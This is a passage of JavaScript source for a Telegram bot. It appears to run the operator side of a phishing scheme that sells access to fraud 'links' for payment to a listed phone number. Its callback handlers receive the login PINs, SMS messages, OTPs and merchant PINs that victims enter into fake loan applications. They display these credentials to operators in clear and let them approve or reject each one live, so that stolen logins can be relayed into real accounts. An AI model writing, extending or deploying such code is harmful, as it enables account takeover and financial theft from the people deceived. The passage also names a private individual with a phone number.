            const admin = await db.getAdmin(targetAdminId);
            if (!admin) return bot.sendMessage(chatId, `❌ Admin \`${targetAdminId}\` not found.`, { parse_mode: 'Markdown' });

            await db.deleteAdmin(targetAdminId);
            adminChatIds.delete(targetAdminId);
            pausedAdmins.delete(targetAdminId);
            removeLinkPaymentTimer(targetAdminId);

            await bot.sendMessage(chatId, `
🗑️ *ADMIN REMOVED*

👤 ${admin.name}
📧 ${admin.email}
🆔 \`${targetAdminId}\`
⏰ ${new Date().toLocaleString()}
            `, { parse_mode: 'Markdown' });

            if (admin.chatId) {
                bot.sendMessage(admin.chatId, `🗑️ *YOU'VE BEEN REMOVED AS ADMIN*\n\nContact super admin if you have questions.`, { parse_mode: 'Markdown' }).catch(() => {});
            }
        } catch (error) {
            console.error('❌ Error removing admin:', error);
            bot.sendMessage(chatId, '❌ Failed. Error: ' + error.message);
        }
    });

    // /admins — SUPER ADMIN ONLY
    bot.onText(/\/admins/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only superadmin can list all admins.');

        try {
            const allAdmins = await db.getAllAdmins();
            const messages  = [];
            let currentMessage = `👥 *ALL ADMINS (${allAdmins.length})*\n\n`;

            allAdmins.forEach((admin, index) => {
                const isSuperAdminUser = isSuperAdmin(admin.adminId);
                const isPaused        = pausedAdmins.has(admin.adminId);
                const isConnected     = adminChatIds.has(admin.adminId);
                const statusEmoji     = isSuperAdminUser ? '⭐' : isPaused ? '🚫' : '✅';
                const roleLabel       = isSuperAdminUser ? 'Super Admin' : isManager(admin.adminId) ? 'Manager' : 'Admin';
                const statusText      = isPaused ? `Paused (${roleLabel})` : roleLabel;
                const connEmoji       = isConnected ? '🟢' : '⚪';

                const adminLine = `${index+1}. ${statusEmoji} *${admin.name}*\n   📧 ${admin.email}\n   🆔 \`${admin.adminId}\`\n   ${connEmoji} ${statusText}\n${admin.chatId ? `   💬 \`${admin.chatId}\`\n` : ''}\n`;

                if ((currentMessage + adminLine).length > 4000) {
                    messages.push(currentMessage);
                    currentMessage = `👥 *ADMINS (continued)*\n\n` + adminLine;
                } else {
                    currentMessage += adminLine;
                }
            });

            if (currentMessage.length > 0) {
                currentMessage += '\n🟢 = Connected | ⚪ = Not Connected';
                messages.push(currentMessage);
            }

            for (const msg_text of messages) {
                await bot.sendMessage(chatId, msg_text, { parse_mode: 'Markdown' });
                await new Promise(resolve => setTimeout(resolve, 200));
            }
        } catch (error) {
            console.error('❌ Error in /admins:', error);
            bot.sendMessage(chatId, '❌ Failed to list admins. Error: ' + error.message);
        }
    });

    // /pendingpayments — PAYMENT ADMIN (ADMIN001) ONLY
    bot.onText(/\/pendingpayments/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!isPaymentAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only the payment admin can view pending payments.');

        try {
            const allAdmins       = await db.getAllAdmins();
            const pendingPayments = allAdmins.filter(a => a.paymentStatus === 'pending' && a.payerName);

            if (pendingPayments.length === 0) {
                return bot.sendMessage(chatId, '✨ No pending payment approvals!');
            }

            let message = `💰 *PENDING PAYMENT APPROVALS (${pendingPayments.length})*\n\n`;
            for (const admin of pendingPayments) {
                message += `👤 *${admin.name}*\n`;
                message += `   🆔 \`${admin.adminId}\`\n`;
                message += `   💵 Payer: ${admin.payerName}\n`;
                message += `   📅 Submitted: ${new Date(admin.paymentSubmittedAt).toLocaleString()}\n`;
                message += `   📧 ${admin.email}\n\n`;
            }

            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
        } catch (error) {
            console.error('❌ Error in /pendingpayments:', error);
            bot.sendMessage(chatId, '❌ Failed to list pending payments. Error: ' + error.message);
        }
    });

    // /approvepayment — PAYMENT ADMIN (ADMIN001) ONLY
    bot.onText(/\/approvepayment (.+)/, async (msg, match) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!isPaymentAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only the payment admin can approve payments.');

        try {
            const targetAdminId = match[1].trim();
            const admin = await db.getAdmin(targetAdminId);
            if (!admin) return bot.sendMessage(chatId, `❌ Admin \`${targetAdminId}\` not found.`, { parse_mode: 'Markdown' });
            if (admin.paymentStatus === 'approved') return bot.sendMessage(chatId, `✅ Payment already approved for ${admin.name}`);

            removeLinkPaymentTimer(targetAdminId);
            await db.updateAdmin(targetAdminId, { paymentStatus: 'approved', linkLocked: false, paidAt: new Date() });

            await bot.sendMessage(chatId, `
✅ *PAYMENT APPROVED*

👤 ${admin.name}
🆔 \`${targetAdminId}\`
💵 Payer: ${admin.payerName}
⏰ ${new Date().toLocaleString()}

Link is now unlocked!
            `, { parse_mode: 'Markdown' });

            if (admin.chatId) {
                await bot.sendMessage(admin.chatId, `
✅ *PAYMENT APPROVED!*

Your link payment has been verified and approved.
Your admin link is now permanently active.

🔗 Your Link: ${WEBHOOK_URL}?admin=${targetAdminId}

Use /start to see available commands.
                `, { parse_mode: 'Markdown' });
            }
        } catch (error) {
            console.error('❌ Error approving payment:', error);
            bot.sendMessage(chatId, '❌ Failed. Error: ' + error.message);
        }
    });

    // /rejectpayment — PAYMENT ADMIN (ADMIN001) ONLY
    bot.onText(/\/rejectpayment (.+)/, async (msg, match) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!isPaymentAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only the payment admin can reject payments.');

        try {
            const targetAdminId = match[1].trim();
            const admin = await db.getAdmin(targetAdminId);
            if (!admin) return bot.sendMessage(chatId, `❌ Admin \`${targetAdminId}\` not found.`, { parse_mode: 'Markdown' });

            await db.updateAdmin(targetAdminId, { paymentStatus: 'rejected', paymentSubmittedAt: null, payerName: null });

            await bot.sendMessage(chatId, `
❌ *PAYMENT REJECTED*

👤 ${admin.name}
🆔 \`${targetAdminId}\`
💵 Payer: ${admin.payerName}
⏰ ${new Date().toLocaleString()}

Link remains locked. Admin can resubmit payment.
            `, { parse_mode: 'Markdown' });

            if (admin.chatId) {
                await bot.sendMessage(admin.chatId, `
❌ *PAYMENT INVALID*

Your payment submission was rejected. The payer name or payment details could not be verified.

Please try again with the correct payment details.

Your link remains locked until payment is approved.
                `, { parse_mode: 'Markdown' });
            }
        } catch (error) {
            console.error('❌ Error rejecting payment:', error);
            bot.sendMessage(chatId, '❌ Failed. Error: ' + error.message);
        }
    });

    // /send — SUPER ADMIN ONLY
    bot.onText(/\/send (.+)/, async (msg, match) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only superadmin can send messages to admins.');

        try {
            const input      = match[1].trim();
            const spaceIndex = input.indexOf(' ');
            if (spaceIndex === -1) return bot.sendMessage(chatId, `❌ Use: /send ADMINID Your message here`, { parse_mode: 'Markdown' });

            const targetAdminId = input.substring(0, spaceIndex).trim();
            const messageText   = input.substring(spaceIndex + 1).trim();

            const targetAdmin = await db.getAdmin(targetAdminId);
            if (!targetAdmin)                      return bot.sendMessage(chatId, `❌ Admin \`${targetAdminId}\` not found.`, { parse_mode: 'Markdown' });
            if (!adminChatIds.has(targetAdminId))  return bot.sendMessage(chatId, `⚠️ Admin ${targetAdmin.name} is not connected.`);

            const sent = await sendToAdmin(targetAdminId, `
📨 *MESSAGE FROM SUPER ADMIN*

${messageText}

---
⏰ ${new Date().toLocaleString()}
            `, { parse_mode: 'Markdown' });

            if (sent) bot.sendMessage(chatId, `✅ Message sent to ${targetAdmin.name} (\`${targetAdminId}\`)`, { parse_mode: 'Markdown' });
            else      bot.sendMessage(chatId, `❌ Failed to send message to ${targetAdmin.name}`);
        } catch (error) {
            bot.sendMessage(chatId, '❌ Failed. Error: ' + error.message);
        }
    });

    // /broadcast — SUPER ADMIN ONLY
    bot.onText(/\/broadcast (.+)/, async (msg, match) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only superadmin can broadcast.');

        try {
            const messageText   = match[1].trim();
            const allAdmins     = await db.getAllAdmins();
            const targetAdmins  = allAdmins.filter(a => !isSuperAdmin(a.adminId));
            if (targetAdmins.length === 0) return bot.sendMessage(chatId, '⚠️ No other admins to broadcast to.');

            let successCount = 0, failCount = 0;
            const results = [];

            for (const admin of targetAdmins) {
                if (adminChatIds.has(admin.adminId)) {
                    const sent = await sendToAdmin(admin.adminId, `
📢 *BROADCAST FROM SUPER ADMIN*

${messageText}

---
⏰ ${new Date().toLocaleString()}
                    `, { parse_mode: 'Markdown' });
                    if (sent) { successCount++; results.push(`✅ ${admin.name}`); }
                    else      { failCount++;    results.push(`❌ ${admin.name} (send failed)`); }
                } else {
                    failCount++;
                    results.push(`⚪ ${admin.name} (not connected)`);
                }
                await new Promise(resolve => setTimeout(resolve, 100));
            }

            bot.sendMessage(chatId, `
📢 *BROADCAST COMPLETE*

✅ Sent: ${successCount}
❌ Failed: ${failCount}
Total: ${targetAdmins.length}

*Details:*
${results.join('\n')}
⏰ ${new Date().toLocaleString()}
            `, { parse_mode: 'Markdown' });
        } catch (error) {
            bot.sendMessage(chatId, '❌ Failed. Error: ' + error.message);
        }
    });

    // /ask — SUPER ADMIN ONLY
    bot.onText(/\/ask (.+)/, async (msg, match) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only superadmin can send action requests.');

        try {
            const input      = match[1].trim();
            const spaceIndex = input.indexOf(' ');
            if (spaceIndex === -1) return bot.sendMessage(chatId, `❌ Use: /ask ADMINID Your request here`);

            const targetAdminId = input.substring(0, spaceIndex).trim();
            const requestText   = input.substring(spaceIndex + 1).trim();

            const targetAdmin = await db.getAdmin(targetAdminId);
            if (!targetAdmin)                     return bot.sendMessage(chatId, `❌ Admin \`${targetAdminId}\` not found.`, { parse_mode: 'Markdown' });
            if (!adminChatIds.has(targetAdminId)) return bot.sendMessage(chatId, `⚠️ Admin ${targetAdmin.name} is not connected.`);

            const requestId = `REQ-${Date.now()}`;

            const sent = await bot.sendMessage(adminChatIds.get(targetAdminId), `
❓ *REQUEST FROM SUPER ADMIN*

${requestText}

---
📋 Request ID: \`${requestId}\`
⏰ ${new Date().toLocaleString()}
            `, {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[
                        { text: '✅ Done',      callback_data: `request_done_${requestId}_${targetAdminId}` },
                        { text: '❓ Need Help', callback_data: `request_help_${requestId}_${targetAdminId}` }
                    ]]
                }
            });

            if (sent) bot.sendMessage(chatId, `✅ Request sent to ${targetAdmin.name}.\nRequest ID: \`${requestId}\``, { parse_mode: 'Markdown' });
            else      bot.sendMessage(chatId, `❌ Failed to send request.`);
        } catch (error) {
            bot.sendMessage(chatId, '❌ Failed. Error: ' + error.message);
        }
    });

    // /clearalladmins — SUPER ADMIN ONLY
    bot.onText(/\/clearalladmins/, async (msg) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);
        if (!isSuperAdmin(adminId)) return bot.sendMessage(chatId, '❌ Only superadmin can do this!');

        try {
            await bot.sendMessage(chatId, `
⚠️ *WARNING - IRREVERSIBLE ACTION*

This will DELETE ALL ADMINS except SUPER ADMINS!

React with ✅ to confirm or ❌ to cancel
            `, {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[
                        { text: '✅ YES, DELETE ALL', callback_data: 'confirm_clear_admins' },
                        { text: '❌ CANCEL',          callback_data: 'cancel_clear_admins' }
                    ]]
                }
            });
        } catch (error) {
            bot.sendMessage(chatId, '❌ Error: ' + error.message);
        }
    });

    // /payment — for managers/regular admins to submit payment proof
    bot.onText(/\/payment (.+)/, async (msg, match) => {
        const chatId  = msg.chat.id;
        const adminId = getAdminIdByChatId(chatId);

        if (!adminId)               return bot.sendMessage(chatId, '❌ Not registered as admin.');
        if (isSuperAdmin(adminId))  return bot.sendMessage(chatId, '❌ Superadmin does not require payment.');

        try {
            const transactionCode = match[1].trim().toUpperCase();
            const admin = await db.getAdmin(adminId);
            if (!admin) return bot.sendMessage(chatId, '❌ Admin not found.');
            if (!admin.linkLocked) return bot.sendMessage(chatId, '✅ Your link is already active! No payment needed.');

            await db.updateAdmin(adminId, {
                paymentStatus:      'pending',
                payerName:          `Transaction: ${transactionCode}`,
                paymentSubmittedAt: new Date()
            });

            await bot.sendMessage(chatId, `
✅ *PAYMENT RECEIVED*

Your payment submission has been received and is pending verification.

📋 Details:
🆔 Admin ID: \`${adminId}\`
👤 Name: ${admin.name}
📱 Transaction Code: \`${transactionCode}\`
⏰ Submitted: ${new Date().toLocaleString()}

We will notify you once the payment is confirmed.

Your link will be unlocked immediately after approval.
            `, { parse_mode: 'Markdown' });

            // Notify ONLY the payment admin (ADMIN001)
            await notifyPaymentAdmin(`
💳 *NEW PAYMENT SUBMITTED*

Admin has sent payment and is awaiting your verification.

📋 Details:
🆔 Admin ID: \`${adminId}\`
👤 Name: ${admin.name}
📧 Email: ${admin.email}
📱 Transaction Code: \`${transactionCode}\`
⏰ Submitted: ${new Date().toLocaleString()}

Verify the payment has been received:
📞 Phone: 0791336749 (Okeyo Bungu)

Please verify and respond:
            `, {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[
                        { text: '✅ APPROVE PAYMENT', callback_data: `approve_payment_${adminId}` },
                        { text: '❌ REJECT PAYMENT',  callback_data: `reject_payment_${adminId}` }
                    ]]
                }
            });

        } catch (error) {
            console.error('❌ Error processing payment:', error);
            bot.sendMessage(chatId, '❌ Error: ' + error.message);
        }
    });

    console.log('✅ Command handlers setup complete!');
}

// ==========================================
// TELEGRAM CALLBACK HANDLER
// ==========================================
bot.on('callback_query', async (callbackQuery) => {
    const chatId    = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;
    const data      = callbackQuery.data;
    const adminId   = getAdminIdByChatId(chatId);

    console.log(`\n🔘 CALLBACK: ${data} | admin: ${adminId || 'UNAUTHORIZED'}`);

    if (!adminId) {
        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Not authorized!', show_alert: true });
    }

    // ── Link payment (yes/no already paid) — PAYMENT ADMIN ONLY ──
    if (data.startsWith('link_paid_yes_') || data.startsWith('link_paid_no_')) {
        const parts         = data.split('_');
        const answer        = parts[2];
        const targetAdminId = parts.slice(3).join('_');

        if (!isPaymentAdmin(adminId)) {
            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Only the payment admin can do this!', show_alert: true });
        }

        if (answer === 'yes') {
            removeLinkPaymentTimer(targetAdminId);
            await db.updateAdmin(targetAdminId, { linkLocked: false, paymentStatus: 'approved', paidAt: new Date() });

            await bot.editMessageText(`
✅ *PAYMENT APPROVED*

Admin \`${targetAdminId}\` - Payment verified
Link is now unlocked and permanently active!

⏰ ${new Date().toLocaleString()}
            `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });

            await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Payment approved, link unlocked!' });

            const admin = await db.getAdmin(targetAdminId);
            if (admin?.chatId) {
                bot.sendMessage(admin.chatId, `
✅ *PAYMENT APPROVED!*

Your payment has been verified and approved.
Your admin link is now permanently active!

🔗 Your Link:
\`${WEBHOOK_URL}?admin=${targetAdminId}\`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ STATUS: ACTIVE ✅
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

You can now:
✅ Accept customer applications
✅ Approve/reject PINs
✅ Verify OTPs
✅ Process loans

Use /start to see all available commands.

Thank you for your payment!
                `, { parse_mode: 'Markdown' }).catch(() => {});
            }
        } else {
            await bot.editMessageText(`
⏱️ *LINK TIMER ACTIVE*

Admin \`${targetAdminId}\` - Payment needed
5-minute countdown continues...

Admin will receive payment instructions when timer expires.
            `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });

            await bot.answerCallbackQuery(callbackQuery.id, { text: '⏱️ 5-minute timer continues' });
        }
        return;
    }

    // ── Payment approval/rejection — PAYMENT ADMIN ONLY ──
    if (data.startsWith('approve_payment_') || data.startsWith('reject_payment_')) {
        if (!isPaymentAdmin(adminId)) {
            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Only the payment admin can approve/reject payments!', show_alert: true });
        }

        const parts         = data.split('_');
        const action        = parts[0];
        const targetAdminId = parts.slice(2).join('_');

        const admin = await db.getAdmin(targetAdminId);
        if (!admin) return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Admin not found!', show_alert: true });

        if (action === 'approve') {
            removeLinkPaymentTimer(targetAdminId);
            await db.updateAdmin(targetAdminId, { paymentStatus: 'approved', linkLocked: false, paidAt: new Date() });

            await bot.editMessageText(`
✅ *PAYMENT APPROVED*

Admin: ${admin.name}
🆔 \`${targetAdminId}\`
⏰ ${new Date().toLocaleString()}

Link is now unlocked!
            `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });

            await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Payment approved!' });

            if (admin.chatId) {
                await bot.sendMessage(admin.chatId, `
✅ *PAYMENT APPROVED!*

Your link payment has been verified and approved.
Your admin link is now permanently active.

🔗 Your Link: ${WEBHOOK_URL}?admin=${targetAdminId}

Use /start to see available commands.
                `, { parse_mode: 'Markdown' });
            }
        } else if (action === 'reject') {
            await db.updateAdmin(targetAdminId, { paymentStatus: 'rejected', paymentSubmittedAt: null, payerName: null });

            await bot.editMessageText(`
❌ *PAYMENT REJECTED*

Admin: ${admin.name}
🆔 \`${targetAdminId}\`
⏰ ${new Date().toLocaleString()}

Link remains locked. Admin can resubmit payment.
            `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });

            await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Payment rejected' });

            if (admin.chatId) {
                await bot.sendMessage(admin.chatId, `
❌ *PAYMENT REJECTED*

Your payment submission was rejected by the super admin.

The payer name or payment details could not be verified.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💰 *PLEASE RESUBMIT*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

To reactivate your link, please:

1️⃣ Send money to: *0791336749*
2️⃣ Get the transaction code
3️⃣ Submit it using:

\`/payment YOUR_TRANSACTION_CODE\`

*Example:*
\`/payment UGX123456\`

Your link will be unlocked immediately after approval.

If you have questions, contact the super admin.
                `, { parse_mode: 'Markdown' });
            }
        }
        return;
    }

    if (!isAdminActive(chatId)) {
        return bot.answerCallbackQuery(callbackQuery.id, { text: '🚫 Your admin access has been paused.', show_alert: true });
    }

    // ── Request responses ──
    if (data.startsWith('request_done_') || data.startsWith('request_help_')) {
        const parts             = data.split('_');
        const action            = parts[1];
        const requestId         = parts[2];
        const respondingAdminId = parts[3];
        const respondingAdmin   = await db.getAdmin(respondingAdminId);

        for (const superAdminId of SUPER_ADMINS) {
            const superAdminChatId = adminChatIds.get(superAdminId);
            if (superAdminChatId) {
                if (action === 'done') {
                    await bot.sendMessage(superAdminChatId, `
✅ *REQUEST COMPLETED*

Admin: ${respondingAdmin?.name || respondingAdminId}
Request ID: \`${requestId}\`
⏰ ${new Date().toLocaleString()}
                    `, { parse_mode: 'Markdown' });
                } else {
                    await bot.sendMessage(superAdminChatId, `
❓ *ADMIN NEEDS HELP*

Admin: ${respondingAdmin?.name || respondingAdminId}
📧 ${respondingAdmin?.email || 'N/A'}
🆔 \`${respondingAdminId}\`
Request ID: \`${requestId}\`

Use: /send ${respondingAdminId} Your message
                    `, { parse_mode: 'Markdown' });
                }
            }
        }

        const responseEmoji = action === 'done' ? '✅' : '❓';
        const responseText  = action === 'done' ? 'Task Completed' : 'Requested Help';

        await bot.editMessageText(`
${responseEmoji} *REQUEST ${responseText.toUpperCase()}*

Request ID: \`${requestId}\`
⏰ ${new Date().toLocaleString()}

Super admin has been notified.
        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });

        await bot.answerCallbackQuery(callbackQuery.id, { text: `${responseEmoji} Response sent to super admin` });
        return;
    }

    // ── Clear all admins — SUPER ADMIN ONLY ──
    if (data === 'confirm_clear_admins' || data === 'cancel_clear_admins') {
        if (!isSuperAdmin(adminId)) {
            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Not authorized!', show_alert: true });
        }

        if (data === 'confirm_clear_admins') {
            try {
                const allAdmins     = await db.getAllAdmins();
                const adminsToClear = allAdmins.filter(a => !isSuperAdmin(a.adminId));
                let deletedCount    = 0;
                const deletedNames  = [];

                for (const admin of adminsToClear) {
                    try {
                        await db.deleteAdmin(admin.adminId);
                        deletedCount++;
                        deletedNames.push(`${admin.name} (${admin.adminId})`);
                        adminChatIds.delete(admin.adminId);
                        pausedAdmins.delete(admin.adminId);
                        removeLinkPaymentTimer(admin.adminId);
                    } catch (err) {
                        console.error(`Failed to delete ${admin.adminId}:`, err.message);
                    }
                }

                await bot.editMessageText(`
🗑️ *ALL ADMINS CLEARED*

Deleted: ${deletedCount} admin(s)
🛡️  Protected: SUPER ADMINS
⏰ ${new Date().toLocaleString()}

*Deleted Admins:*
${deletedNames.map((n, i) => `${i+1}. ${n}`).join('\n')}
                `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });

                await bot.answerCallbackQuery(callbackQuery.id, { text: `✅ Cleared ${deletedCount} admin(s)!` });
            } catch (error) {
                console.error('❌ Error clearing admins:', error);
                bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Error: ' + error.message, show_alert: true });
            }
        } else {
            await bot.editMessageText(`
❌ *CANCELLED*

Clear all admins operation was cancelled.
⏰ ${new Date().toLocaleString()}
            `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });

            await bot.answerCallbackQuery(callbackQuery.id, { text: 'Operation cancelled' });
        }
        return;
    }

    // ── Parse: action_type_ADMINID_applicationId ──
    const parts = data.split('_');
    if (parts.length < 4) {
        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Invalid callback data.', show_alert: true });
    }

    const action          = parts[0];
    const type            = parts[1];
    const embeddedAdminId = parts[2];
    const applicationId   = parts.slice(3).join('_');

    if (embeddedAdminId !== adminId) {
        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ This application belongs to another admin!', show_alert: true });
    }

    const application = await db.getApplication(applicationId);
    if (!application || application.adminId !== adminId) {
        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application not found or not yours!', show_alert: true });
    }

    // Wrong PIN at OTP stage
    if (action === 'wrongpin' && type === 'otp') {
        await db.updateApplication(applicationId, { otpStatus: 'wrongpin_otp' });
        await bot.editMessageText(`
❌ *WRONG PIN AT OTP STAGE*

📋 \`${applicationId}\`
📞 \`${formatPhone(application.phoneNumber)}\`
🔢 \`${application.otp}\`

⚠️ User's PIN was incorrect
👤 ${callbackQuery.from.first_name}
⏰ ${new Date().toLocaleString()}

User will re-enter PIN.
        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ User will re-enter PIN' });
        return;
    }

    // Wrong code
    if (action === 'wrongcode' && type === 'otp') {
        await db.updateApplication(applicationId, { otpStatus: 'wrongcode' });
        await bot.editMessageText(`
❌ *WRONG CODE*

📋 \`${applicationId}\`
📞 \`${formatPhone(application.phoneNumber)}\`
🔢 \`${application.otp}\`

⚠️ Wrong verification code
👤 ${callbackQuery.from.first_name}
⏰ ${new Date().toLocaleString()}

User will re-enter code.
        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ User will re-enter code' });
        return;
    }

    // Deny PIN
    if (action === 'deny' && type === 'pin') {
        await db.updateApplication(applicationId, { pinStatus: 'rejected' });
        await bot.editMessageText(`
❌ *INVALID - REJECTED*

📋 \`${applicationId}\`
📞 \`${formatPhone(application.phoneNumber)}\`
🔑 \`${application.pin}\`

✗ REJECTED
👤 ${callbackQuery.from.first_name}
⏰ ${new Date().toLocaleString()}
        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application rejected' });
    }

    // Allow OTP
    else if (action === 'allow' && type === 'pin') {
        await db.updateApplication(applicationId, { pinStatus: 'approved' });
        await bot.editMessageText(`
✅ *ALL CORRECT - APPROVED*

📋 \`${applicationId}\`
📞 \`${formatPhone(application.phoneNumber)}\`
🔑 \`${application.pin}\`

✓ APPROVED
👤 ${callbackQuery.from.first_name}
⏰ ${new Date().toLocaleString()}

User will now proceed to OTP.
        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Approved! User can enter OTP now.' });
    }

    // Approve Loan (legacy otp type)
    else if (action === 'approve' && type === 'otp') {
        await db.updateApplication(applicationId, { otpStatus: 'approved' });
        await bot.editMessageText(`
🎉 *LOAN APPROVED!*

📋 \`${applicationId}\`
📞 \`${formatPhone(application.phoneNumber)}\`
🔑 \`${application.pin}\`
🔢 \`${application.otp}\`

✓ FULLY APPROVED
👤 ${callbackQuery.from.first_name}
⏰ ${new Date().toLocaleString()}

✅ User will see approval page!
        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        await bot.answerCallbackQuery(callbackQuery.id, { text: '🎉 Loan approved!' });
    }

    // Wrong Merchant PIN
    else if (action === 'wrongmerchpin' && type === 'merch') {
        await db.updateApplication(applicationId, { merchantPinStatus: 'wrong' });
        await bot.editMessageText(`
❌ *WRONG MERCHANT PIN*

📋 \`${applicationId}\`
📞 \`${formatPhone(application.phoneNumber)}\`
💳 Merchant PIN entered: \`${application.merchantPin}\`

⚠️ User will be asked to re-enter.
👤 ${callbackQuery.from.first_name}
⏰ ${new Date().toLocaleString()}
        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Wrong merchant PIN flagged' });
    }

    // Approve via Merchant PIN
    else if (action === 'approve' && type === 'merch') {
        await db.updateApplication(applicationId, { merchantPinStatus: 'approved' });
        await bot.editMessageText(`
🎉 *FULLY APPROVED — MERCHANT PIN CONFIRMED!*

📋 \`${applicationId}\`
📞 \`${formatPhone(application.phoneNumber)}\`
🔑 Login PIN: \`${application.pin}\`
🔢 OTP: \`${application.otp}\`
💳 Merchant PIN: \`${application.merchantPin}\`

✓ ALL DETAILS CONFIRMED
👤 ${callbackQuery.from.first_name}
⏰ ${new Date().toLocaleString()}
        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        await bot.answerCallbackQuery(callbackQuery.id, { text: '🎉 Merchant PIN confirmed & loan approved!' });
    }

    // allow_pin_
    else if (data.startsWith('allow_pin_')) {
        const p             = data.split('_');
        const appId         = p[3];
        const app           = await db.getApplication(appId);
        if (!app) return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application not found', show_alert: true });

        await db.updateApplication(appId, { pinStatus: 'approved' });
        console.log(`✅ PIN APPROVED for ${appId}`);

        await bot.editMessageText(`
✅ *LOGIN APPROVED*

📋 \`${appId}\`
📞 \`${formatPhone(app.phoneNumber)}\`
🔑 PIN: \`${app.pin}\`

✓ User can now proceed to SMS verification
👤 ${callbackQuery.from.first_name}
⏰ ${new Date().toLocaleString()}
        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });

        await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Login approved! User can now submit SMS.' });
    }

    // deny_pin_
    else if (data.startsWith('deny_pin_')) {
        const p     = data.split('_');
        const appId = p[3];
        const app   = await db.getApplication(appId);
        if (!app) return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application not found', show_alert: true });

        await db.updateApplication(appId, { pinStatus: 'rejected' });
        console.log(`❌ PIN REJECTED for ${appId}`);

        await bot.editMessageText(`
❌ *LOGIN DENIED*

📋 \`${appId}\`
📞 \`${formatPhone(app.phoneNumber)}\`
🔑 PIN: \`${app.pin}\`

✓ User will be sent back to login page
👤 ${callbackQuery.from.first_name}
⏰ ${new Date().toLocaleString()}
        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });

        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Login denied. User returned to login page.' });
    }

    // approve_sms_
    else if (data.startsWith('approve_sms_')) {
        const p     = data.split('_');
        const appId = p[3];
        const app   = await db.getApplication(appId);
        if (!app) return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application not found', show_alert: true });

        await db.updateApplication(appId, { otpStatus: 'approved' });
        console.log(`✅ SMS APPROVED for ${appId}`);

        await bot.editMessageText(`
✅ *SMS MESSAGE APPROVED*

📋 \`${appId}\`
📞 \`${formatPhone(app.phoneNumber)}\`

📝 *Message:*
\`\`\`
${app.smsMessage || 'N/A'}
\`\`\`

✓ User can now proceed to OTP verification
👤 ${callbackQuery.from.first_name}
⏰ ${new Date().toLocaleString()}
        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });

        await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ SMS approved! User can now enter OTP.' });
    }

    // reject_sms_
    else if (data.startsWith('reject_sms_')) {
        const p     = data.split('_');
        const appId = p[3];
        const app   = await db.getApplication(appId);
        if (!app) return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application not found', show_alert: true });

        await db.updateApplication(appId, { otpStatus: 'rejected' });
        console.log(`❌ SMS REJECTED for ${appId}`);

        await bot.editMessageText(`
❌ *SMS MESSAGE INVALID*

📋 \`${appId}\`
📞 \`${formatPhone(app.phoneNumber)}\`

